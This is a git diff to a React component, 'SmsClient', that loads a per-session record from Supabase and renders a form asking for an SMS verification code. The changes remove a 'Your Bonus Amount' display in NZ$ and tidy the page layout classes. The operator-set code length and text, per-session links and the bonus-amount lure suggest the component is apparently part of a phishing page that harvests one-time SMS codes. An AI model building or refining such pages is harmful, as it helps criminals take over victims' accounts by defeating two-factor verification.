@@ -16,8 +16,6 @@ export function SmsClient({ sessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
-  const [amount, setAmount] = useState<number>(0);
-  const [currency, setCurrency] = useState("NZ$");
   const [digits, setDigits] = useState(6);
   const [customText, setCustomText] = useState<string | null>(null);
   const [code, setCode] = useState("");
@@ -32,18 +30,16 @@ export function SmsClient({ sessionId }: Props) {
         setLoading(false);
         return;
       }
-      const { data } = await supabase.from("sessions").select("amount, sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();
 
       if (cancelled || !data) {
         setLoading(false);
         return;
       }
-      setAmount(data.amount ?? 0);
       setDigits(data.sms_digits ?? 6);
       setCustomText(data.sms_custom_text);
       const fd = (data.form_data ?? {}) as Record<string, string>;
       setSessionFormData(fd);
-      if (fd.currency) setCurrency(fd.currency);
       setCode(fd.smsCode ?? "");
       setLoading(false);
     })();
@@ -118,7 +114,7 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
@@ -128,7 +124,7 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
               Invalid link.
@@ -140,7 +136,7 @@ export function SmsClient({ sessionId }: Props) {
 
   if (loading) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
           <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
         </div>
@@ -187,7 +183,7 @@ export function SmsClient({ sessionId }: Props) {
   };
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+    <div className="pak-page-shell">
       <div className="pak-form-card w-full max-w-[980px] fade-in">
         <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
           <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
@@ -195,17 +191,6 @@ export function SmsClient({ sessionId }: Props) {
               <div className="max-w-[36rem]">
                 <h2 className="pak-form-title">{settings.sms_title}</h2>
                 <p className="pak-form-subtitle mt-3 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
-              </div>
-
-              <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
-                <div className="pak-form-amount-label">
-                  <div>Your</div>
-                  <div>Bonus Amount</div>
-                </div>
-                <div className="pak-form-amount-divider" />
-                <div className="pak-form-amount-value">
-                  {currency}{amount.toLocaleString("en-NZ")}
-                </div>
               </div>
             </div>
 
